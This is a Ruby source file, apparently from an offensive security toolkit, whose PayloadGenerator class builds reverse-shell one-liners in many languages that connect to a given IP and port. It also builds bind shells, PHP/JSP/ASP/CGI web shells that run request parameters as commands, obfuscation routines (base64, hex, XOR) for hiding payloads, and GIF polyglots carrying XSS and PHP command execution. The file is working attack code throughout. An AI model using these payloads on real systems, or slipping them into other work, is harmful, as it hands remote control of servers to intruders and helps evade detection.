require 'uri'
require 'base64'
require_relative '../utils/colorize'

class PayloadGenerator
  def self.generate_reverse_shell(ip, port, shell_type = :bash)
    payloads = {
      bash: "bash -i >& /dev/tcp/#{ip}/#{port} 0>&1",
      sh: "sh -i >& /dev/tcp/#{ip}/#{port} 0>&1",
      python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      python3: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"#{ip}\",#{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      perl: "perl -e 'use Socket;$i=\"#{ip}\";$p=#{port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
      ruby: "ruby -rsocket -e'f=TCPSocket.open(\"#{ip}\",#{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
      php: "<?php system(\"bash -c 'bash -i >& /dev/tcp/#{ip}/#{port} 0>&1'\"); ?>",
      nc: "nc -e /bin/sh #{ip} #{port}",
      nc_openbsd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc #{ip} #{port} >/tmp/f",
      socat: "socat TCP:#{ip}:#{port} EXEC:/bin/sh",
      telnet: "telnet #{ip} #{port} | /bin/sh | telnet #{ip} #{port}",
      awk: "awk 'BEGIN{s=\"/inet/tcp/0/#{ip}/#{port}\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'",
      lua: "lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('#{ip}',#{port});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();end\"",
      nodejs: "node -e \"require('child_process').exec('bash -i >& /dev/tcp/#{ip}/#{port} 0>&1')\"",
      go: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"#{ip}:#{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/s.go && go run /tmp/s.go"
    }
    
    payloads[shell_type] || payloads[:bash]
  end

  def self.generate_bind_shell(port, shell_type = :bash)
    payloads = {
      bash: "bash -i >& /dev/tcp/0.0.0.0/#{port} 0>&1",
      nc: "nc -lvp #{port} -e /bin/sh",
      socat: "socat TCP-LISTEN:#{port},fork EXEC:/bin/sh",
      python: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",#{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
      perl: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(LocalPort,#{port},Reuse,1,Listen)->accept;STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
      ruby: "ruby -rsocket -e 's=TCPServer.new(#{port});while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'",
      php: "<?php system(\"nc -lvp #{port} -e /bin/sh\"); ?>",
      lua: "lua -e \"local s=require('socket');local t=s.tcp();t:bind('*',#{port});t:listen(1);local c=t:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();t:close();end\""
    }
    
    payloads[shell_type] || payloads[:bash]
  end

  def self.generate_web_shell(backdoor_type = :php)
    payloads = {
      php: "<?php system($_GET['cmd']); ?>",
      php_advanced: "<?php if(isset($_GET['cmd'])){echo '<pre>';$cmd=($_GET['cmd']);system($cmd);echo '</pre>';} ?>",
      php_eval: "<?php eval($_POST['cmd']); ?>",
      php_assert: "<?php assert($_POST['cmd']); ?>",
      php_passthru: "<?php passthru($_GET['cmd']); ?>",
      php_exec: "<?php exec($_GET['cmd'],$output);print_r($output); ?>",
      php_shell_exec: "<?php echo shell_exec($_GET['cmd']); ?>",
      php_backticks: "<?php echo `$_GET['cmd']`; ?>",
      jsp: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
      jsp_advanced: "<%@ page import=\"java.util.*,java.io.*\"%><%if(request.getParameter(\"cmd\")!=null){Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null){out.println(line+\"<br>\");}}%>",
      asp: "<%eval request(\"cmd\")%>",
      aspx: "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\",\"/c \"+Request[\"cmd\"]);%>",
      cgi: "#!/usr/bin/perl\nprint \"Content-type: text/html\\n\\n\";\n$cmd=$ENV{'QUERY_STRING'};\nsystem($cmd);",
      perl: "#!/usr/bin/perl\nuse CGI qw(:standard);\n$cmd=param('cmd');\nprint header;\nprint `$cmd`;",
      python: "#!/usr/bin/python\nimport cgi\nimport os\nprint \"Content-type: text/html\\n\\n\"\nform=cgi.FieldStorage()\ncmd=form.getvalue('cmd')\nprint os.popen(cmd).read()",
      ruby: "#!/usr/bin/ruby\nrequire 'cgi'\ncgi=CGI.new\ncmd=cgi['cmd']\nprint cgi.header\nprint `#{cmd}`"
    }
    
    payloads[backdoor_type] || payloads[:php]
  end

  def self.generate_obfuscated_payload(payload, obfuscation_type = :base64)
    case obfuscation_type
    when :base64
      require 'base64'
      Base64.encode64(payload).strip
    when :hex
      payload.unpack('H*').first
    when :url
      URI.encode_www_form_component(payload)
    when :unicode
      payload.bytes.map { |b| "\\u#{b.to_s(16).rjust(4, '0')}" }.join
    when :rot13
      payload.tr('A-Za-z', 'N-ZA-Mn-za-m')
    when :xor
      key = rand(256)
      encrypted = payload.bytes.map { |b| (b ^ key).chr }.join
      "key=#{key},payload=#{Base64.encode64(encrypted).strip}"
    else
      payload
    end
  end

  def self.generate_polyglot_payload
    [
      "GIF89a/*<svg/onload=alert(1)>*/=alert(String.fromCharCode(88,83,83))//",
      "GIF89a/*<script>alert('XSS')</script>*/",
      "GIF89a/*<?php system($_GET['cmd']); ?>*/",
      "GIF89a/*<%eval request(\"cmd\")%>*/",
      "GIF89a/*<script>alert(String.fromCharCode(88,83,83))</script>*/",
      "GIF89a/*<img src=x onerror=alert('XSS')>*/",
      "GIF89a/*<svg onload=alert('XSS')>*/",
      "GIF89a/*javascript:alert('XSS')*/",
      "GIF89a/*'\"><script>alert('XSS')</script>*/",
      "GIF89a/*<body onload=alert('XSS')>*/"
    ]
  end
end

